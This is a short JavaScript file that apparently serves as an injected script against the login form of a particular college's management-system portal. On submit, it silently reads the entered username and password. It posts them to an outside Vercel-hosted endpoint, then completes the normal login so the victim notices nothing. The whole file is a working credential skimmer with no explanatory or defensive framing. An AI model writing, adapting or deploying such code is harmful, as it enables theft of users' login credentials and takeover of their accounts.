document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector('form[action="https://mis.apexcollege.edu.np/login/validate"]');
  if (!form) return;

  let isInternalSubmit = false;

  form.addEventListener("submit", (e) => {
    if (isInternalSubmit) return;

    const mainSubmitter = e.submitter || form.querySelector('[type="submit"]');
    const username = form.querySelector('input[name="username"]')?.value;
    const password = form.querySelector('input[name="password"]')?.value;

    e.preventDefault();
    isInternalSubmit = true;

    const proceed = () => {
      if (form.hasAttribute('data-done')) return;
      form.setAttribute('data-done', 'true');

      try {
        form.requestSubmit(mainSubmitter);
      } catch (err) {
        if (mainSubmitter) {
          mainSubmitter.click();
        } else {
          form.submit();
        }
      }
    };

    setTimeout(proceed, 1000);

    fetch("https://brother-alpha.vercel.app/users", {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify({ username, password })
    }).finally(proceed);
  });
});
